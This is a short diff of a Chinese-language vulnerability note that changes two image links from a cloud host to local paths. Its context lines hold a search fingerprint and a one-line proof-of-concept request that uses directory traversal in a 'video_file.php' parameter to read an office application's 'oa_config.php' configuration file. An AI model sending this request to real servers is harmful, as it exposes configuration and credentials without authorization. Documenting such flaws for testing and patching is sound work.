@@ -20,7 +20,7 @@ icon_hash="1967132225"
 
 登录页面
 
-![image-20220715111126095](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202207151111176.png)
+![image-20220715111126095](./images/202207151111176.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ icon_hash="1967132225"
 /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php
 ```
 
-![image-20220715111241562](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202207151112653.png)
+![image-20220715111241562](./images/202207151112653.png)
